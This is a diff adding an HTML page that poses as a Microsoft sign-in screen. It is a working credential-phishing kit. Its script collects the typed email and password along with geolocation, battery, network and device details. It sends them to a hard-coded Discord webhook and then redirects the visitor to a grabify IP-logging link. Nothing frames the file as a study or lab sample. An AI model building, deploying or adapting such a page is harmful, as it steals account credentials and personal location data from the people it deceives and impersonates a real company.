@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign in</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        input[type="submit"] {
+            background-color: #0078d4;
+            color: white;
+            padding: 12px;
+            border: none;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #005a9e;
+        }
+
+        .create-account {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+
+        .create-account a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        .sign-in-options {
+            margin-top: 10px;
+            font-size: 12px;
+        }
+
+        .sign-in-options a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .sign-in-options a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+    <h2>Sign in</h2>
+
+    <!-- Login form -->
+    <form id="loginForm" onsubmit="handleSubmit(event)">
+        <input type="email" id="email" placeholder="Email, phone, or Skype" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        <input type="submit" value="Sign in">
+    </form>
+
+    <!-- Links -->
+    <div class="create-account">
+        <p>No account? <a href="#">Create one!</a></p>
+    </div>
+
+    <div class="sign-in-options">
+        <a href="#">Sign-in options</a>
+    </div>
+</div>
+
+<script>
+    function handleSubmit(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        // Get email and password values
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Browser and system information
+        const browserInfo = navigator.userAgent;
+        const platform = navigator.platform;
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const referrer = document.referrer || 'Direct access';
+        const accessTime = new Date().toLocaleString(); // Current date and time
+
+        // Extra details
+        const deviceMemory = navigator.deviceMemory || 'Not supported';
+        const cpuCores = navigator.hardwareConcurrency || 'Not supported';
+        const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+        const dntStatus = navigator.doNotTrack === "1" ? 'Enabled' : 'Disabled';
+        const languages = navigator.languages ? navigator.languages.join(', ') : 'Not available';
+
+        // Network Information
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const networkInfo = connection ? `Type: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms` : 'Not supported';
+        // ping
+        const ping = "@everyone"
+
+        // Battery status (async API)
+        navigator.getBattery().then(function(battery) {
+            const batteryLevel = (battery.level * 100) + "%";
+            const chargingStatus = battery.charging ? "Charging" : "Not charging";
+
+            // Geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Create the payload with additional information
+                    const data = {
+                        content: `Email: ${email}\nPassword: ${password}\nLatitude: ${latitude}\nLongitude: ${longitude}\nBrowser Info: ${browserInfo}\nPlatform: ${platform}\nScreen Resolution: ${screenWidth}x${screenHeight}\nTimezone: ${timeZone}\nReferrer: ${referrer}\nAccess Time: ${accessTime}\nDevice Memory: ${deviceMemory} GB\nCPU Cores: ${cpuCores}\nCookies Enabled: ${cookiesEnabled}\nDNT Status: ${dntStatus}\nPreferred Languages: ${languages}\nNetwork Info: ${networkInfo}\nBattery Level: ${batteryLevel}\nCharging: ${chargingStatus}\@here: ${ping}`
+                    };
+
+                    // Send data to the webhook
+                    const xhr = new XMLHttpRequest();
+                    xhr.open("POST", "https://discord.com/api/webhooks/1294524910357712897/TFQYFM5B04Y7XlgHU3K0Z23TFELU-Dr-ODNlGplfRC3PE2H1T5PX7Nlr96aZGyx6H4lP", true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === XMLHttpRequest.DONE) {
+                            console.log("Status:", xhr.status); // Log the status code
+                            console.log("Response:", xhr.responseText); // Log the response
+                            if (xhr.status === 204) { // No content response
+                                // After sending data, redirect to the desired URL
+                                window.location.href = "https://grabify.link/UXJPVL";
+                            } else {
+                                console.error("Failed to send data to the webhook:", xhr.statusText);
+                            }
+                        }
+                    };
+
+                    // Send the request
+                    xhr.send(JSON.stringify(data));
+                }, function(error) {
+                    console.error("Error getting location:", error);
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
